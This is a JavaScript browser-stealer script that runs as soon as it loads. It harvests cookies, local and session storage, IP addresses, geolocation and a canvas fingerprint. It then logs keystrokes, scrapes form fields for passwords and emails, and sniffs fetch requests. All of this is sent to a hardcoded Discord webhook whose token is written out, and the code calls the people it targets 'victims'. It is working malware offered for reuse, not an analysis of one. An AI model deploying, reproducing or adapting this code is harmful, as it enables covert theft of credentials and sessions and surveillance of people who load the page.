// === DISCORD WEBHOOK - REPLACE WITH YOURS ===
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1475299568844537978/sY0Q1M8QTyU2Pwung5uuIb5Dn3nvqhuD3tnmEvyGf48ZkFmQfiy-MSBIJCs5k8LQDYER';

// === INITIAL HARVEST (runs immediately) ===
(async function() {
    const victimData = {
        timestamp: new Date().toISOString(),
        url: window.location.href,
        referrer: document.referrer
    };

    // 1. ALL STORAGE
    victimData.cookies = document.cookie;
    victimData.localStorage = {...localStorage};
    victimData.sessionStorage = {...sessionStorage};

    // 2. IP ADDRESSES
    victimData.ip_v4 = await fetchIP('https://api.ipify.org');
    victimData.ip_v6 = await fetchIP('https://ipv6.icanhazip.com');

    // 3. LOCATION
    victimData.location = await getLocation();

    // 4. FULL FINGERPRINT
    victimData.fingerprint = await getFingerprint();

    // 5. SEND INITIAL DUMP
    await sendToDiscord('🚨 **NEW VICTIM CONNECTED**', victimData, 0xFF0000);

    // 6. START LIVE LOGGING
    startLiveLogging();

    async function fetchIP(url) {
        try {
            const res = await fetch(url);
            return await res.text();
        } catch { return 'unknown'; }
    }

    async function getLocation() {
        return new Promise(resolve => {
            navigator.geolocation.getCurrentPosition(
                pos => resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
                () => resolve('denied'),
                { enableHighAccuracy: true, timeout: 3000 }
            );
        });
    }

    async function getFingerprint() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            canvas: getCanvasFP()
        };
    }

    function getCanvasFP() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Fingerprint v1.0', 2, 2);
        return canvas.toDataURL();
    }

    // LIVE LOGGING ENGINE
    function startLiveLogging() {
        let keystrokes = [];
        let forms = [];
        let network = [];

        // KEYSTROKE LOGGER
        document.addEventListener('keydown', e => {
            keystrokes.push(`${e.key}(${e.code})`);
            if (keystrokes.length > 20) {
                sendToDiscord('⌨️ **KEYSTROKES**', { keys: keystrokes.slice(-10) }, 0x00FF00);
                keystrokes = [];
            }
        });

        // FORM STEALER
        setInterval(() => {
            document.querySelectorAll('input, textarea').forEach(el => {
                if (el.value && !forms.some(f => f.name === el.name)) {
                    forms.push({
                        name: el.name || el.id || 'input',
                        type: el.type,
                        value: el.value.slice(0, 100)
                    });
                }
            });
            if (forms.length) {
                sendToDiscord('📝 **FORM DATA**', {
                    credentials: forms.filter(f => f.type === 'password' || f.type === 'email'),
                    total: forms.length
                }, 0xFFA500);
                forms = [];
            }
        }, 1000);

        // NETWORK SNIFFER
        const origFetch = window.fetch;
        window.fetch = async (...args) => {
            const res = await origFetch(...args);
            network.push({
                method: args[1]?.method || 'GET',
                url: args[0],
                status: res.status
            });
            if (network.length > 5) {
                sendToDiscord('🌐 **API REQUESTS**', { requests: network.slice(-3) });
                network = [];
            }
            return res;
        };

        // PAGE EVENTS
        window.addEventListener('beforeunload', () => {
            sendToDiscord('🚪 **VICTIM LEAVING**', { final_dump: true }, 0x800080);
        });
    }

    // DISCORD SENDER
    async function sendToDiscord(title, data, color = 0xFF6B6B) {
        try {
            const payload = {
                username: 'DataLogger',
                avatar_url: 'https://i.imgur.com/steal.png',
                embeds: [{
                    title: title,
                    color: color,
                    fields: Object.entries(data).map(([k, v]) => ({
                        name: k.slice(0, 20),
                        value: String(v).slice(0, 1000),
                        inline: k.length < 15
                    })),
                    timestamp: new Date().toISOString(),
                    footer: { text: `Session: ${Math.random().toString(36).slice(2)}` }
                }]
            };

            await fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            });
        } catch(e) {
            console.log('Exfil failed:', e);
        }
    }

})();
